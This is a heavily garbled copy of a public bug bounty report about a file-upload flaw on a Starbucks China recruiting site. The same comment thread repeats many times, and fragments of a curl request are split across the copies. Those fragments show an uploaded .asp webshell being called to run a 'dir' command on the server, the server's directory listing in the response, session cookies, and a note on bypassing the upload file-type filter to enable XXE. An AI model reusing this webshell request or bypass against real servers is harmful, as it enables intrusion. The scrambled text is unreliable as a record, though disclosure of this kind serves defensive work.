- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

**The response content:**

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 02:56:19 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 1814533

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
d:\TrustHX\STBKSERM101\www_app\bin
d:\TrustHX\STBKSERM101\www_app\common
d:\TrustHX\STBKSERM101\www_app\concurrent_test
d:\TrustHX\STBKSERM101\www_app\Default.aspx
d:\TrustHX\STBKSERM101\www_app\Global.asax
d:\TrustHX\STBKSERM101\www_app\hximages_v6
....................................
</textarea>
</body>
</html>
```

**Show the internal source code**
```
curl -i -s -k  -X 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
GET' \
    -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Host: ecjobs.starbucks.com.cn' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Connection: close' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 

- **Report Filed**
